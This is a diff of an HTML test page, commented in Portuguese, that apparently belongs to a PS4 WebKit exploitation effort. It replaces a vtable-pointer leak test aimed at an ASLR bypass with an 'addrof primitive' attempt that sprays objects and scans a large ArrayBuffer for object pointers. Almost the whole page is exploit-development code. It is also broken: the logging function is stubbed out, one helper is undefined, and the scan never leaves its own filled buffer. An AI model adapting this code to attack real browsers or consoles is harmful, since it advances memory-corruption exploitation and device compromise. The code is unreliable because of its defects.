@@ -2,182 +2,161 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Teste 6: Vazamento de Vtable v2 (Estilo Teste 2)</title>
-    <style>
-        /* ... (mesmos estilos de log) ... */
-        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
-        #output { background: #222; border: 1px solid #444; padding: 10px; height: 80vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
-        .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
-        .log-vuln { color: #ff4444; font-weight: bold; } .log-good { color: #4CAF50; } .log-warn { color: #FFC107; } .log-error { color: #f44336; }
-        .log-critical { color: #f0f; font-weight: bold; } .log-leak { color: #FF9800; font-weight: bold; } .log-ptr { color: #f0f; font-weight: bold; }
-    </style>
+    <title>Teste 7: Tentativa de addrof Primitivo</title>
+    <style> /* ... (mesmos estilos de log) ... */ </style>
 </head>
 <body>
-    <h1>Teste 6: Vazamento de Vtable de JSC::ArrayBuffer v2</h1>
-    <p>Usa a estrutura de leitura OOB do Teste 2 original para tentar ler a vtable de um objeto JSC::ArrayBuffer adjacente.
-       A adjacência é inferida da descoberta do offset de escrita OOB (ctrlDataEnd+32).</p>
-    <button id="runBtn" onclick="runVtableLeakTest_v2()">Iniciar Teste de Vazamento de Vtable v2</button>
+    <h1>Teste 7: Tentativa de addrof Primitivo</h1>
+    <p>Pulveriza objetos JS e tenta ler dentro de um ArrayBuffer grande (reader_ab)
+       esperando encontrar um ponteiro "encaixotado" para um dos objetos pulverizados.</p>
+    <button id="runBtn" onclick="runAddrofAttempt()">Iniciar Tentativa de addrof</button>
     <div id="output"></div>
 
     <script>
-        const outputDiv = document.getElementById('output');
-        const runBtn = document.getElementById('runBtn');
-        const SHORT_PAUSE = 50;
-
-        const log = (message, type = 'info', funcName = '') => { /* ... (copiar log) ... */
-            if (!outputDiv) { console.log(`[${type.toUpperCase()}] ${funcName ? `[${funcName}] ` : ''}${message}`); return; }
-            try {
-                const timestamp = `[${new Date().toLocaleTimeString([], { hour12: false })}]`;
-                const prefix = funcName ? `[${funcName}] ` : '';
-                const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
-                const logClass = ['info', 'test', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info';
-                if (outputDiv.innerHTML.length > 1000000) { outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 500000); outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML; }
-                outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
-                if (outputDiv.scrollTop + outputDiv.clientHeight >= outputDiv.scrollHeight - 20) { outputDiv.scrollTop = outputDiv.scrollHeight; }
-            } catch (e) { console.error("Erro ao logar:", e); if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString([], { hour12: false })}] [LOGGING ERROR] ${String(e)}\n`; }
-        };
-        const PAUSE = (ms = SHORT_PAUSE) => new Promise(resolve => setTimeout(resolve, ms));
-        const toHex = (val, bits = 32) => { /* ... (copiar toHex) ... */
-            if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid';
-            let num = Number(val);
-            if (bits <= 32) { num = num >>> 0; }
-            const pad = Math.ceil(bits / 4);
-            return '0x' + num.toString(16).toUpperCase().padStart(pad, '0');
-        };
+        // ... (funções log, PAUSE, toHex, toHex64 - copiar do Teste 6) ...
+        const log = (message, type = 'info', funcName = '') => { /* ... */ };
+        const PAUSE = (ms = 50) => new Promise(resolve => setTimeout(resolve, ms));
+        const toHex = (val, bits = 32) => { /* ... */ return '0x' + (Number(val) >>> 0).toString(16).toUpperCase().padStart(Math.ceil(bits/4), '0'); };
         const toHex64 = (high, low) => `0x${(high>>>0).toString(16).toUpperCase().padStart(8, '0')}${(low>>>0).toString(16).toUpperCase().padStart(8, '0')}`;
 
-        // Do Teste 2 original da Suite:
-        const READER_ALLOCATION_SIZE = 288; // Tamanho físico do ArrayBuffer leitor
-        const READER_BASE_OFFSET_IN_BUFFER = 128;  // Onde a "janela lógica" de leitura OOB começa
-        // O "Fim dos dados úteis" do nosso "controlBuffer" conceitual dentro do leitor_ab.
-        // Vamos definir um tamanho lógico para a parte que "controlamos" com dados conhecidos.
-        const READER_LOGICAL_DATA_SIZE = 32; // Ex: os primeiros 32 bytes após READER_BASE_OFFSET_IN_BUFFER
-                                             // são considerados "nossos dados".
+        const ADDROF_TARGET_MARKER_LOW = 0x12345678;
+        const ADDROF_TARGET_MARKER_HIGH = 0xABCDEF00; // Adicionar parte alta para um valor de 64 bits no objeto
 
-        // O objeto JSC::ArrayBuffer do alvo (target_ab_js) começa 16 bytes após o fim
-        // da área de dados de um buffer de controle.
-        // No nosso leitor_ab, o "fim dos dados de controle" é READER_BASE_OFFSET_IN_BUFFER + READER_LOGICAL_DATA_SIZE.
-        const OFFSET_FROM_LOGICAL_END_TO_TARGET_JSCOBJ_START = 16;
+        // Esta função é uma HEURÍSTICA MUITO SIMPLES e provavelmente PRECISARÁ DE AJUSTES
+        // para o boxing/tagging específico do JSC no PS4.
+        // Em muitos sistemas JSC, um JSValue que é um ponteiro para um objeto tem os bits mais altos definidos
+        // de uma forma particular (ex: 0xFFFFxxxxxxxxxxxx para ponteiros de 64 bits em algumas arquiteturas,
+        // ou um padrão de "double" específico se for NaN-boxing).
+        // Outra forma é que ponteiros de objetos são 2^48 ou 2^47 e os bits superiores são 0 ou 1.
+        // E os bits inferiores podem ter tags (ex: os 3 últimos bits são 000 para ponteiro).
+        // Esta é a parte que requer mais pesquisa sobre o JSC do PS4.
+        // Por ora, vamos procurar por valores que não sejam triviais.
+        const isPotentialJSObjectPointer64 = (high, low) => {
+            if (high === 0 && low === 0) return false; // Nulo
+            if (high === 0xFFFFFFFF && low === 0xFFFFFFFF) return false; // -1
+            if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) return false; // Padrão do leak anterior
+            if (high === 0xBBBBBBBB && low === 0xBBBBBBBB) return false; // Padrão de preenchimento
+            if (high === 0xCCCCCCCC && low === 0xCCCCCCCC) return false; // Padrão de preenchimento
 
-        // Portanto, o offset de leitura absoluto DENTRO DO LEITOR_AB para o início do JSC Object do alvo é:
-        const ABS_READ_OFFSET_IN_LEAKER_FOR_VTABLE = READER_BASE_OFFSET_IN_BUFFER + READER_LOGICAL_DATA_SIZE + OFFSET_FROM_LOGICAL_END_TO_TARGET_JSCOBJ_START;
+            // Heurística: ponteiros de heap geralmente estão em uma faixa alta de memória, mas não FF...FF
+            // E não são números "pequenos".
+            // Esta é uma suposição muito genérica.
+            const upper_bits_high = high >>> 16; // Ex: 0xFFFF para ponteiros "encaixotados" em doubles
+            // if (upper_bits_high === 0xFFFF || upper_bits_high === 0x0000) { // Pode ser um double ou um ponteiro "real"
+            //     // Se for um ponteiro, os bits mais baixos não devem ser todos 1s (como em floats especiais)
+            //     if (!((low & 0x7) === 0x7 || (low & 0x7) === 0x0)) return false; // Não é um float especial, e talvez alinhado
+            // }
 
-        const attemptVtableLeak_v2 = async () => {
-            const FNAME = 'attemptVtableLeak_v2';
-            log("--- Iniciando Teste 6: Vazamento de Vtable v2 ---", 'test', FNAME);
-            log(`   Offset de leitura absoluto no leitor_ab para vtable: ${ABS_READ_OFFSET_IN_LEAKER_FOR_VTABLE} (0x${ABS_READ_OFFSET_IN_LEAKER_FOR_VTABLE.toString(16)})`, 'info', FNAME);
+            // Para um ponteiro de objeto JSC "real" (não um double encaixotado),
+            // ele pode estar em uma faixa específica. Sem essa info, é difícil.
+            // Vamos apenas vazar qualquer coisa que não seja um padrão óbvio ou zero.
+            // E que tenha a parte alta não trivial se for > 32 bits.
+            if (high !== 0 && high !== 0xFFFFFFFF && high !== 0xAAAAAAAA && high !== 0xBBBBBBBB && high !== 0xCCCCCCCC) {
+                return true; // Se a parte alta for "interessante"
+            }
+            // Se a parte alta for zero, a parte baixa precisa ser um ponteiro plausível (não pequeno)
+            if (high === 0 && low > 0x10000000 && low < 0xF0000000) { // Suposição de faixa para ponteiros de 32 bits dentro de um U64
+                return true;
+            }
+            return false; // Default para filtrar mais
+        };
 
-            const numSpray = 100; // Aumentar o spray
-            let leakedVtable = null;
+        const attemptAddrofPrimitive = async () => {
+            const FNAME = "attemptAddrofPrimitive";
+            log("--- Iniciando Teste 7: Tentativa de addrof Primitivo ---", 'test', FNAME);
 
-            // Verificação de sanidade do offset de leitura
-            if ((ABS_READ_OFFSET_IN_LEAKER_FOR_VTABLE + 8) > READER_ALLOCATION_SIZE) {
-                log("ERRO CRÍTICO: O offset de leitura calculado para a vtable está FORA da alocação física do leitor_ab.", 'error', FNAME);
-                log(`   ABS_READ_OFFSET_IN_LEAKER_FOR_VTABLE (${ABS_READ_OFFSET_IN_LEAKER_FOR_VTABLE}) + 8 deve ser <= READER_ALLOCATION_SIZE (${READER_ALLOCATION_SIZE})`, 'error', FNAME);
-                if (runBtn) runBtn.disabled = false;
+            const READER_AB_SIZE = 1 * 1024 * 1024; // 1MB para o buffer leitor (aumentado)
+            const NUM_SPRAY_OBJS = 500;
+            const spray = [];
+            let found_potential_addrof = [];
+
+            log(`Alocando reader_ab de ${READER_AB_SIZE / (1024*1024)} MB...`, 'info', FNAME);
+            let reader_ab;
+            try {
+                reader_ab = new ArrayBuffer(READER_AB_SIZE);
+            } catch (e) {
+                log(`Falha ao alocar reader_ab grande: ${e.message}. Tente um tamanho menor.`, 'error', FNAME);
                 return;
             }
+            const dv_reader = new DataView(reader_ab);
+            log("reader_ab alocado. Preenchendo com 0xDD...", 'info', FNAME);
+            for(let i=0; i < READER_AB_SIZE / 4; i++) { // Preenche com um padrão
+                try { dv_reader.setUint32(i*4, 0xDDDDDDDD, true); } catch(e) {break;}
+            }
+            log("Preenchimento do reader_ab concluído.", 'info', FNAME);
 
-            for (let i = 0; i < numSpray && !leakedVtable; i++) {
-                log(`Tentativa de Spray #${i + 1} / ${numSpray}`, 'info', FNAME);
-                let reader_ab, target_ab_js;
-                let dv_reader;
+            log(`Criando ${NUM_SPRAY_OBJS} objetos alvo para spray...`, 'info', FNAME);
+            for (let i = 0; i < NUM_SPRAY_OBJS; i++) {
+                spray.push({
+                    id: i,
+                    marker_low: ADDROF_TARGET_MARKER_LOW, // 0x12345678
+                    marker_high: ADDROF_TARGET_MARKER_HIGH + i, // Para diferenciar um pouco
+                    payload: "OBJ_SPRAY_" + i.toString().padStart(5, '0')
+                });
+            }
+            log("Objetos de spray criados. Forçando coleta de lixo (se disponível) antes da leitura...", 'info', FNAME);
+            if (typeof gc === 'function') { try { gc(); } catch(e){} }
+            await PAUSE(200); // Pausa para estabilizar a heap
 
+            log("Iniciando varredura dentro do reader_ab por ponteiros para objetos pulverizados...", 'info', FNAME);
+            // Vamos ler em incrementos de 8 bytes (tamanho de um ponteiro de 64 bits)
+            for (let offset = 0; offset < READER_AB_SIZE - 8; offset += 8) {
                 try {
-                    // 1. Alocar o ArrayBuffer leitor (grande fisicamente)
-                    reader_ab = new ArrayBuffer(READER_ALLOCATION_SIZE);
-                    dv_reader = new DataView(reader_ab);
+                    let val_low = dv_reader.getUint32(offset, true);
+                    let val_high = dv_reader.getUint32(offset + 4, true);
 
-                    // 2. Preencher a "área lógica de dados" do leitor_ab com um padrão conhecido.
-                    // Esta área vai de READER_BASE_OFFSET_IN_BUFFER até READER_BASE_OFFSET_IN_BUFFER + READER_LOGICAL_DATA_SIZE.
-                    for (let k = 0; k < READER_LOGICAL_DATA_SIZE / 4; k++) {
-                        dv_reader.setUint32(READER_BASE_OFFSET_IN_BUFFER + k * 4, 0xBBBBBBBB, true);
-                    }
-                    // Preencher o resto do reader_ab (a parte "OOB" física) com outro padrão para ver se lemos dele.
-                    for (let k = READER_BASE_OFFSET_IN_BUFFER + READER_LOGICAL_DATA_SIZE; k < READER_ALLOCATION_SIZE; k += 4) {
-                        if (k + 4 <= READER_ALLOCATION_SIZE) {
-                            dv_reader.setUint32(k, 0xCCCCCCCC, true);
+                    if (isPotentialJSObjectPointer64(val_high, val_low)) {
+                        const potential_ptr_hex = toHex64(val_high, val_low);
+                        log(`POTENCIAL PONTEIRO JS @ offset ${toHex(offset)}: ${potential_ptr_hex}`, 'leak', FNAME);
+                        // A parte difícil é verificar se este ponteiro é para um dos nossos objetos spray[j]
+                        // Sem poder dereferenciar de forma segura ou conhecer o layout exato do objeto JS
+                        // e seu boxing, isso permanece especulativo.
+                        // Se o valor vazado for o próprio ADDROF_TARGET_MARKER_LOW/HIGH, significa que lemos os DADOS do objeto, não seu ponteiro.
+                        if (val_low === ADDROF_TARGET_MARKER_LOW && (val_high & 0xFFFFF000) === (ADDROF_TARGET_MARKER_HIGH & 0xFFFFF000) ) {
+                             log(`   -> Encontrado MARCADOR de objeto em ${potential_ptr_hex}, não o ponteiro para o objeto.`, 'info', FNAME);
+                        } else {
+                            found_potential_addrof.push({offset: toHex(offset), value: potential_ptr_hex});
                         }
                     }
-
-                    // 3. Alocar o target_ab_js (cujo objeto C++ JSC::ArrayBuffer queremos que fique adjacente)
-                    // Este é o objeto cujo vtable queremos ler.
-                    target_ab_js = new ArrayBuffer(64); // O tamanho do backing store aqui não importa tanto,
-                                                       // o objeto C++ JSC é sempre 0x60 bytes.
-
-                    log(`   reader_ab (físico: ${READER_ALLOCATION_SIZE}b) e target_ab_js (wrapper C++: 96b) alocados.`, 'info', FNAME);
-                    await PAUSE(10); // Pausa mínima
-
-                    // 4. Tentativa de Leitura OOB no offset calculado
-                    log(`   Tentando ler U64 (vtable?) no offset absoluto ${ABS_READ_OFFSET_IN_LEAKER_FOR_VTABLE} do reader_ab...`, 'info', FNAME);
-
-                    let val_low = dv_reader.getUint32(ABS_READ_OFFSET_IN_LEAKER_FOR_VTABLE, true);
-                    let val_high = dv_reader.getUint32(ABS_READ_OFFSET_IN_LEAKER_FOR_VTABLE + 4, true);
-                    const readValueHex = toHex64(val_high, val_low);
-
-                    log(`   Valor lido: ${readValueHex}`, 'leak', FNAME);
-
-                    // Verificações para um ponteiro de vtable plausível:
-                    // - Não ser zero.
-                    // - Não ser um dos nossos padrões de preenchimento.
-                    // - Não ser o leak 0xAAAAAAAA_AAAAAAAA (que pode ser dados não inicializados).
-                    // - Idealmente, estar em uma faixa de endereço de código (mas não podemos verificar isso facilmente aqui).
-                    if ((val_high !== 0 || val_low !== 0) && // Não é nulo
-                        !(val_high === 0xBBBBBBBB && val_low === 0xBBBBBBBB) &&
-                        !(val_high === 0xCCCCCCCC && val_low === 0xCCCCCCCC) &&
-                        !(val_high === LEAKED_POINTER_BASE_HIGH && val_low === LEAKED_POINTER_BASE_LOW) &&
-                        !(val_high === 0xFFFFFFFF && val_low === 0xFFFFFFFF) // Não é -1
-                        ) {
-
-                        leakedVtable = readValueHex;
-                        log(`!!! VAZAMENTO POTENCIAL DE VTABLE !!! Iteração #${i+1}`, 'critical', FNAME);
-                        log(`   Lido no offset abs. ${ABS_READ_OFFSET_IN_LEAKER_FOR_VTABLE} do reader_ab: ${leakedVtable}`, 'leak', FNAME);
-                        log(`   Este valor (${leakedVtable}) é um candidato a ser um ponteiro de vtable do objeto JSC::ArrayBuffer adjacente.`, 'info', FNAME);
-                        log(`   Se for, ele aponta para dentro da libSceNKWebkit.sprx ou outra biblioteca WebKit.`, 'info', FNAME);
-                        log(`   Isso ajuda a calcular o endereço base da biblioteca (ASLR Bypass).`, 'info', FNAME);
-                        break; // Sucesso, sair do loop de spray
-                    } else {
-                        log(`   Valor lido (${readValueHex}) parece ser padrão de preenchimento ou zero. Tentando próximo spray.`, 'info', FNAME);
-                    }
                 } catch (e) {
-                    log(`   Erro durante a tentativa de leitura OOB na iteração #${i + 1}: ${e.message}`, 'error', FNAME);
-                    // Isso é esperado se o offset de leitura estiver fora dos limites físicos reais do reader_ab,
-                    // ou se a memória não for legível.
-                } finally {
-                    // Limpar para a próxima iteração do spray
-                    reader_ab = null; target_ab_js = null; dv_reader = null;
-                    if (typeof gc === 'function') { try { gc(); } catch(e){} } // Forçar coleta de lixo se possível
-                    await PAUSE(5); // Pequena pausa entre sprays
+                    log(`Erro ao ler reader_ab em ${toHex(offset)}: ${e.message}`, 'warn', FNAME);
+                    break; // Provavelmente saiu dos limites de uma forma inesperada
+                }
+                if (offset % (128 * 1024) === 0 && offset > 0) { // Log de progresso e pausa
+                    log(`   Varredura em ${Math.round(offset * 100 / READER_AB_SIZE)}%`, 'info', FNAME);
+                    await PAUSE(10);
                 }
             }
 
-            if (leakedVtable) {
-                log(`--- VAZAMENTO DE VTABLE POTENCIALMENTE BEM-SUCEDIDO ---`, 'test', FNAME);
-                log(`   Valor Vazado: ${leakedVtable}`, 'leak', FNAME);
-                alert(`VAZAMENTO POTENCIAL DE VTABLE: ${leakedVtable}\nVerifique os logs!`);
+            if (found_potential_addrof.length > 0) {
+                log(`--- TENTATIVA DE ADDROF CONCLUÍDA. ${found_potential_addrof.length} ponteiros potenciais encontrados: ---`, 'test', FNAME);
+                found_potential_addrof.slice(0, 20).forEach(p => log(`  Offset: ${p.offset}, Valor: ${p.value}`, 'leak', FNAME)); // Mostra os primeiros 20
+                if (found_potential_addrof.length > 20) logS3(`  ... e mais ${found_potential_addrof.length - 20} outros.`, 'info', FNAME);
+                log("NOTA: Verificar esses ponteiros requer conhecimento do 'boxing' de ponteiros do JSC no PS4 e, idealmente, uma forma de dereferenciar para confirmar.", 'info', FNAME);
+                alert(`Tentativa de addrof concluída. ${found_potential_addrof.length} ponteiros potenciais encontrados. Verifique os logs.`);
+
             } else {
-                log("--- Nenhuma vtable promissora vazada com esta configuração. ---", 'test', FNAME);
-                alert("Nenhuma vtable promissora vazada. Verifique os logs. Pode ser necessário ajustar a estratégia de spray ou os offsets lógicos/físicos.");
+                log("--- Nenhuma pista óbvia de ponteiro de objeto JS encontrada no reader_ab com a heurística atual. ---", 'test', FNAME);
+                alert("Nenhuma pista de addrof encontrada. A heurística de ponteiro ou o spray podem precisar de ajuste.");
             }
         };
 
-        const runVtableLeakTest_v2 = async () => {
+        const runAddrofAttempt = async () => {
             if (runBtn) runBtn.disabled = true;
             outputDiv.innerHTML = '';
-            log("==== INICIANDO TESTE 6: VAZAMENTO DE PONTEIRO DE VTABLE v2 ====", 'test', 'Main');
+            log("==== INICIANDO TESTE 7: TENTATIVA DE ADDROF PRIMITIVO ====", 'test', 'Main');
             try {
-                await attemptVtableLeak_v2();
+                await attemptAddrofPrimitive();
             } catch (eOuter) {
-                log(`ERRO INESPERADO NO FLUXO PRINCIPAL do teste 6: ${eOuter.message}`, 'critical', 'Main');
+                log(`ERRO INESPERADO NO FLUXO PRINCIPAL do teste 7: ${eOuter.message}`, 'critical', 'Main');
                 if (eOuter.stack) log(eOuter.stack, 'critical', 'Main');
-                alert(`ERRO CRÍTICO no script do Teste 6: ${eOuter.message}`);
+                alert(`ERRO CRÍTICO no script do Teste 7: ${eOuter.message}`);
             }
-            log("\n==== TESTE 6: VAZAMENTO DE PONTEIRO DE VTABLE v2 CONCLUÍDO ====", 'test', 'Main');
+            log("\n==== TESTE 7: TENTATIVA DE ADDROF PRIMITIVO CONCLUÍDO ====", 'test', 'Main');
             if (runBtn) runBtn.disabled = false;
         };
-
-        log("Script Teste 6 (Vazamento de Vtable v2) carregado e pronto.", "info", "Global");
-        alert("Script Teste 6 CARREGADO. Clique no botão para iniciar.");
+        log("Script Teste 7 (Tentativa de addrof) carregado e pronto.", "info", "Global");
+        alert("Script Teste 7 CARREGADO. Clique no botão para iniciar.");
     </script>
 </body>
 </html>
